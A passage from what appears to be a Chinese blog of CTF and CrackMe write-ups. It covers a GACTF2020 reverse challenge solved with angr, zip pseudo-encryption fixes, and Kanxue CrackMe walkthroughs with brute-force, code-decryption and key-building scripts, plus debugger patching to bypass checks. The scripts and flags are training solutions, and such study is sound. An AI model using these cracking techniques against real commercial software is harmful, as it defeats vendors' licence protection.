dword_804B2A4</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">70</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>从上面打印出的执行，整个程序就很清楚了。</p><p>首先就是逆出输入的第一个整型数据，但看了下算法，确实麻烦。。正好之前学习了下angr符号执行，用这个题尝试一下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr, claripy, sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_success</span><span class="params">(state)</span>:</span></span><br><span class="line">    std_out = state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b'flag:'</span> <span class="keyword">in</span> std_out:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_false</span><span class="params">(state)</span>:</span></span><br><span class="line">    std_out = state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b'错误信息'</span> <span class="keyword">in</span> std_out:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">'EasyRe'</span>) <span class="comment">#代表程序的“初始化映像”</span></span><br><span class="line">init_state = proj.factory.entry_state() <span class="comment">#表示模拟从程序的入口点开始的状态</span></span><br><span class="line">good_addr = <span class="number">0x08048BE0</span> </span><br><span class="line">bad_addr = <span class="number">0x08048BF1</span></span><br><span class="line">sim = proj.factory.simgr(init_state) <span class="comment">#申明state的模拟管理器sim来用于执行模拟的程序</span></span><br><span class="line">sim.explore(find = is_success) <span class="comment">#模拟程序的执行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>): <span class="comment">#打印出标准输入，输出，错误输出。</span></span><br><span class="line">print(sim.found[<span class="number">0</span>].posix.dumps(i))</span><br></pre></td></tr></table></figure><p><img src="/2020/08/30/GACTF2020/image-20200913202220431.png" alt="image-20200913202220431"></p><p>很快得到了答案，尝试输入一下，正确。<img src="/2020/08/30/GACTF2020/image-20200913200733625.png" alt="image-20200913200733625"></p><p>开始使用这个整型数据计算出dword_804B2A0数组中的4个值。</p><p>刚刚计算完准备依次逆出flag中的每一位时就想到，其实可以不用计算第一个输入的整型数据，因为给了flag的格式为GACTF。。。根据这个就可以计算出dword_804B2A0数组中的每一位。。</p><p>开始利用之前复制到C语言编译器中的代码打印出flag中每一位与dword_804B2A0[]数组异或的是哪一位，与最后需要用来比较的数据。</p><p>最后算一下，得到flag：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> a[] = &#123;<span class="number">267</span>, <span class="number">122</span>, <span class="number">149</span>, <span class="number">262</span>, <span class="number">125</span>, <span class="number">173</span>, <span class="number">303</span>, <span class="number">357</span>,</span><br><span class="line"><span class="number">301</span>, <span class="number">303</span>, <span class="number">313</span>, <span class="number">269</span>, <span class="number">187</span>, <span class="number">8</span>, <span class="number">269</span>, <span class="number">319</span>, </span><br><span class="line"><span class="number">314</span>, <span class="number">353</span>, <span class="number">87</span>, <span class="number">288</span>, <span class="number">269</span>, <span class="number">319</span>, <span class="number">319</span>, <span class="number">181</span>,</span><br><span class="line"><span class="number">275</span>, <span class="number">160</span>, <span class="number">289</span>, <span class="number">269</span>, <span class="number">11</span>, <span class="number">313</span>, <span class="number">371</span>, <span class="number">70</span>&#125;;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">char</span> b[] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>,</span><br><span class="line"><span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>,</span><br><span class="line"><span class="number">2</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">33</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> s[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;, i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">s[<span class="number">0</span>] = <span class="string">'G'</span> ^ a[<span class="number">0</span>];</span><br><span class="line">s[<span class="number">1</span>] = <span class="string">'A'</span> ^ a[<span class="number">1</span>];</span><br><span class="line">s[<span class="number">2</span>] = <span class="string">'T'</span> ^ a[<span class="number">3</span>];</span><br><span class="line">s[<span class="number">3</span>] = <span class="string">'C'</span> ^ a[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">flag[i] = a[i] ^ s[b[i]];</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(flag);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//GACTF&#123;c7ack_m3_sh3ll_smc_vm_0k?&#125;</span></span><br></pre></td></tr></table></figure><p>其实也是很简单的一个题，利用flag的格式。。</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="SignIN"><a href="#SignIN" class="headerlink" title="SignIN"></a>SignIN</h3><p>将二维码拼接一下，扫出flag。</p><p><img src="/2020/08/30/GACTF2020/image-20200913201331681.png" alt="image-20200913201331681"></p><p><strong>welc0me_t0_GACTF_have_Fun</strong></p><h3 id="crymisc"><a href="#crymisc" class="headerlink" title="crymisc"></a>crymisc</h3><p>一个word文档，但是打不开。拖进010editor查看，发现<strong>504B(PK)</strong>，是一个压缩包。</p><p>改文件后缀后其中一个文件解压失败。</p><p><img src="/2020/08/30/GACTF2020/image-20200913202250211.png" alt="image-20200913202250211"></p><p>谷歌看见可以使用winrar来修复一下。</p><p>下载后，在winrar中打开却是提示有密码。。那就猜测是伪加密了。。下面修改为偶数即可。<img src="/2020/08/30/GACTF2020/image-20200913203212543.png" alt="image-20200913203212543"></p><p>360压缩还是奇妙，伪加密文件直接提示文件出错。。</p><p>然后打开一张图片和一个文本文件。文本文件没有什么，查看图片二进制信息。在最后发现：<img src="/2020/08/30/GACTF2020/image-20200913203442903.png" alt="image-20200913203442903"></p><p>又是一个压缩包，但在开头出现一个字符串，从组成猜测是base64加密。解密得到：<img src="/2020/08/30/GACTF2020/image-20200913203556733.png" alt="image-20200913203556733"></p><p>看来是后面压缩包的密码。然后把该压缩包的头补全（<strong>504b</strong>），输入密码解压：<img src="/2020/08/30/GACTF2020/image-20200913203858388.png" alt="image-20200913203858388"></p><p>到这一步就一直卡住了。。。实在没见过这个表情密码，谷歌百度查到的信息又不会用，，，</p><p>比赛完了才从一位师傅哪里知道要自己从github找到这个项目自己搭建一下环境，然后根据一张表映射关系解密。。。</p><p>根据师傅的指导搭建完后，从题目也很容易想到解密的key是哭脸表情。</p><p>最后解密：<img src="/2020/08/30/GACTF2020/image-20200913204636657.png" alt="image-20200913204636657"></p><p>还有一个坑就是，下面的表情其实是同一个，我还纠结半天。。<img src="/2020/08/30/GACTF2020/image-20200913204805711.png" alt="image-20200913204805711"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CrackMe</title>
      <link href="/2020/07/31/CrackMe/"/>
      <url>/2020/07/31/CrackMe/</url>
      
        <content type="html"><![CDATA[<p>本帖主要对练习Crackme的知识点与突破点进行记录。<a id="more"></a></p><h2 id="翩若惊鸿"><a href="#翩若惊鸿" class="headerlink" title="翩若惊鸿"></a>翩若惊鸿</h2><p>——题目来自看雪题库</p><p>无壳，窗口程序，随便输入一个name与key看程序的反馈。</p><p>有错误提示框，载入OD搜索相应的API，只是很多API序号，应该是MFC42库序号导出的函数。<img src="/2020/07/31/CrackMe/image-20200813120443310.png" alt="image-20200813120443310"></p><p>那现在搜索字符串看看，或使用一个下断点的插件下断，然后查看调用堆栈信息找到API。这里2种方法均可。<img src="/2020/07/31/CrackMe/image-20200813121018755.png" alt="image-20200813121018755"></p><p>向上回溯：<img src="/2020/07/31/CrackMe/image-20200813125708215.png" alt="image-20200813125708215"></p><p>开始在OD中跟进<strong>004015E0</strong>函数，但很多MFC42中导出的函数，跟起来实在恼火。。还是结合ida的F5大法来看：</p><p>一开始逆向分析算法就发现了问题：<img src="/2020/07/31/CrackMe/image-20200813133718116.png" alt="image-20200813133718116"></p><p>上面说明是个死胡同，这里就可以猜测是上面有对函数对402010处代码进行了重写。看前面的代码，果不其然：用了我们输入key的前4位来重写402010处代码，且最后一个校验（检测重写的代码是否正确），校验通过才将重写的代码拷贝到原地址处（0x402010）。<img src="/2020/07/31/CrackMe/image-20200813134136959.png" alt="image-20200813134136959"></p><p>看了看重写与校验的代码，都不复杂，大多数可以直接复制到编译器来作为一个函数使用进而爆破出正确的重写的代码，也就是得到key的前4位。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> hash_table[<span class="number">0x401</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_401500</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; </span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; </span><br><span class="line">  <span class="keyword">int</span> *v2; </span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; </span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v4; </span><br><span class="line"></span><br><span class="line">  hash_table[<span class="number">0x400</span>] = <span class="number">1</span>;</span><br><span class="line">  v0 = <span class="number">0x0EDB88320</span>;</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  v2 = hash_table;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    *v2 = v1;</span><br><span class="line">    result = v1;</span><br><span class="line">    v4 = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = ((result &amp; <span class="number">1</span>) != <span class="number">0</span> ? v0 : <span class="number">0</span>) ^ (result &gt;&gt; <span class="number">1</span>);</span><br><span class="line">      --v4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v4 );</span><br><span class="line">    *v2 = result;</span><br><span class="line">    ++v2;</span><br><span class="line">    ++v1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v1 &lt; <span class="number">0x400</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decode_code</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> result; </span><br><span class="line"></span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  a3 ^= <span class="number">0xD9EE7A1B</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(result + a1) ^= *((<span class="keyword">char</span> *)&amp;a3 + (result &amp; <span class="number">3</span>));</span><br><span class="line">      ++result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( result &lt; a2 );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_401550</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> *a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; </span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; </span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = ~a1; v3 &lt; a3; ++v3 )</span><br><span class="line">    i = hash_table[(<span class="keyword">unsigned</span> __int8)i ^ *(<span class="keyword">unsigned</span> __int8 *)(v3 + a2)] ^ (i &gt;&gt; <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">return</span> ~i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] = &#123;<span class="number">0x402010</span><span class="number">-0x402AC0</span>的数据&#125;; </span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> s = <span class="number">0x30303030</span>, e = <span class="number">0x7a7a7a7a</span>, i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> decode_data[<span class="number">0xAB0</span>];</span><br><span class="line"><span class="keyword">clock_t</span> start, <span class="built_in">end</span>, total;</span><br><span class="line"> </span><br><span class="line">start = clock();</span><br><span class="line">sub_401500();</span><br><span class="line"><span class="keyword">for</span>(i = s; i &lt;= e; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span> *a = (<span class="keyword">char</span> *)&amp;i;</span><br><span class="line"><span class="keyword">if</span>(a[<span class="number">0</span>] &lt; <span class="number">48</span> || a[<span class="number">1</span>] &lt; <span class="number">48</span> || a[<span class="number">2</span>] &lt; <span class="number">48</span> || a[<span class="number">3</span>] &lt; <span class="number">48</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>((a[<span class="number">0</span>] &gt; <span class="number">57</span> &amp;&amp; a[<span class="number">0</span>] &lt; <span class="number">65</span>) || (a[<span class="number">1</span>] &gt; <span class="number">57</span> &amp;&amp; a[<span class="number">1</span>] &lt; <span class="number">65</span>) || </span><br><span class="line">(a[<span class="number">2</span>] &gt; <span class="number">57</span> &amp;&amp; a[<span class="number">2</span>] &lt; <span class="number">65</span>) || (a[<span class="number">3</span>] &gt; <span class="number">57</span> &amp;&amp; a[<span class="number">3</span>] &lt; <span class="number">65</span>))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>((a[<span class="number">0</span>] &gt; <span class="number">90</span> &amp;&amp; a[<span class="number">0</span>] &lt; <span class="number">97</span>) || (a[<span class="number">1</span>] &gt; <span class="number">90</span> &amp;&amp; a[<span class="number">1</span>] &lt; <span class="number">97</span>) ||</span><br><span class="line">(a[<span class="number">2</span>] &gt; <span class="number">90</span> &amp;&amp; a[<span class="number">2</span>] &lt; <span class="number">97</span>) || (a[<span class="number">3</span>] &gt; <span class="number">90</span> &amp;&amp; a[<span class="number">3</span>] &lt; <span class="number">97</span>))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(a[<span class="number">0</span>] &gt; <span class="number">122</span> || a[<span class="number">1</span>] &gt; <span class="number">122</span> || a[<span class="number">2</span>] &gt; <span class="number">122</span> || a[<span class="number">3</span>] &gt; <span class="number">122</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="built_in">memcpy</span>(decode_data, ida_chars, <span class="number">0xAB0</span>); </span><br><span class="line">decode_code(decode_data, <span class="number">0xAB0</span>, i);</span><br><span class="line"><span class="keyword">if</span>(sub_401550(<span class="number">0</span>, decode_data, <span class="number">0xAB0</span>) == <span class="number">0xAFFE390F</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%X\n"</span>, i);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c%c%c%c\n"</span>, a[<span class="number">0</span>], a[<span class="number">1</span>], a[<span class="number">2</span>], a[<span class="number">3</span>]);</span><br><span class="line"><span class="built_in">end</span> = clock();</span><br><span class="line">total = (<span class="built_in">end</span>-start)/CLOCKS_PER_SEC;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"爆破所用时间：%d分:%d秒\n"</span>, total/<span class="number">60</span>, total%<span class="number">60</span>);</span><br><span class="line"><span class="keyword">break</span>; </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还挺快就得到了答案，主要是要优化去除不可能的字符。<img src="/2020/07/31/CrackMe/image-20200813135150617.png" alt="image-20200813135150617"></p><p>以为到这里应该就结束了，解密出的代码就是一个简单的对key与name判断，算法会很简单。是我想多了🤣，说起这个算法我就是痛，花了好多时间动调猜测一些函数的作用，伪代码实在不好看，也不想看了，汇编就不说了。。</p><p><strong>开始进入解密部分</strong></p><p>写ida-python脚本对<strong>00402010</strong>开始的代码解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">addr = <span class="number">0x402010</span></span><br><span class="line">s = [<span class="number">89</span>, <span class="number">63</span>, <span class="number">-85</span>, <span class="number">-97</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0xab0</span>):</span><br><span class="line">    PatchByte(addr+i, (Byte(addr+i)^s[i&amp;<span class="number">3</span>])&amp;<span class="number">0xff</span>)</span><br></pre></td></tr></table></figure><p>来到解密后的函数：<img src="/2020/07/31/CrackMe/image-20200813141328038.png" alt="image-20200813141328038"></p><p>由于最后要name计算出的整数与key计算出的整数相等，而name计算出的整数在OD的内存中十六进制存放，这是可以看到的。而key计算出数据时也是依次得到数据的每一位，然后*16转化一个整数。所以我们只要让key计算出的每一位与name计算后的数据的每一位相等即可。且16进制数只有“0123456789ABCDEF”这些数字，所以可以先得到一张这样的映射表。</p><p>模拟sub_4021A0与sub_402A40函数得到表：<strong>这里我对sub_402A40进行了简化，因为只有0-F的数字，所以只有这几个小正数情况。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">0xff</span>; i++)</span><br><span class="line"><span class="keyword">if</span>(((i^<span class="number">0x86</span>)<span class="number">-48</span>) == j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(j == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"&#123;%#X"</span>, i);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">", %#X"</span>, i);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"&#125;"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/31/CrackMe/image-20200813144333400.png" alt="image-20200813144333400"></p><p>最后我以计算name为Bxb的key，事先得到了Bxb计算出的数据：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[] = <span class="string">"1D702A7304A94"</span>;</span><br><span class="line"><span class="keyword">int</span> a[] = &#123;<span class="number">0XB6</span>, <span class="number">0XB7</span>, <span class="number">0XB4</span>, <span class="number">0XB5</span>, <span class="number">0XB2</span>, <span class="number">0XB3</span>, <span class="number">0XB0</span>,</span><br><span class="line">   <span class="number">0XB1</span>, <span class="number">0XBE</span>, <span class="number">0XBF</span>, <span class="number">0XBC</span>, <span class="number">0XBD</span>, <span class="number">0XBA</span>, <span class="number">0XBB</span>, <span class="number">0XB8</span>, <span class="number">0XB9</span>&#125;; </span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = <span class="string">"BEEF"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; s[i]; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> temp = s[i];</span><br><span class="line"><span class="keyword">if</span>(temp &gt;= <span class="number">48</span> &amp;&amp; temp &lt;= <span class="number">57</span>)</span><br><span class="line">temp -= <span class="number">48</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">temp -= <span class="number">55</span>;</span><br><span class="line"><span class="built_in">sprintf</span>(flag+i*<span class="number">2</span>+<span class="number">4</span>, <span class="string">"%X"</span>, a[temp]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(flag);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/31/CrackMe/image-20200813144918630.png" alt="image-20200813144918630"></p><p>做到这，真的不想再看这个题了，我就想不通，伪代码怎么如此绕，key的生成算法都动调了好多遍。所以那个name计算的算法也真的不想看了。。。进而不能得到注册机。</p><p>其次这个题，对要改变数据的内存地址，传参都是使用ecx传参指向this*。</p><h2 id="乘风破浪"><a href="#乘风破浪" class="headerlink" title="乘风破浪"></a>乘风破浪</h2><p>——题目来自看雪题库</p><p>题目难点：题目开始启动双线程，线程之间以事件通讯。对于不清楚双线程，自然会有很多疑问，跟踪程序起来也会困难一些。</p><p>首先以不知道双线程的角度来跟踪程序：</p><p>查看程序中的获取控件文本内容的API，搜索发现没有GetDlgItemText，但是有GetWindowTextLenthW与GetWindowTextW。双击进入。<img src="/2020/07/31/CrackMe/image-20200731174647264.png" alt="image-20200731174647264"></p><p>由于后面肯定会对输入数据进行验证处理，所以在数据窗口对该地址下硬件访问断点, F9运行断下后：<img src="/2020/07/31/CrackMe/image-20200731175348583.png" alt="image-20200731175348583"></p><p>上面汇编代码很简单，就是比较输入的name与key是否相等且最后以这个来确定返回值，尝试打开程序看验证一下，不对的。继续跟着程序返回：既然上一个验证函数是错误的，下面这个箭头所指跳转就不能实现才正确。<img src="/2020/07/31/CrackMe/image-20200731175649160.png" alt="image-20200731175649160"></p><p>修改标志寄存器后，单步分析401299以下的代码，很多无用的跳转，还是简单，一个验证：name与key的逆序是否相等且长度要不小于8。再次打开程序验证一下，正确。所以程序的key只要是name的逆序就正确。</p><p>当然我对程序还是有很多疑问，从出题人的帖子看到说是双线程。</p><p>开始去学习多线程的知识，觉得讲的很清楚的一个帖子：<a href="https://blog.csdn.net/LL596214569/article/details/89163734" target="_blank" 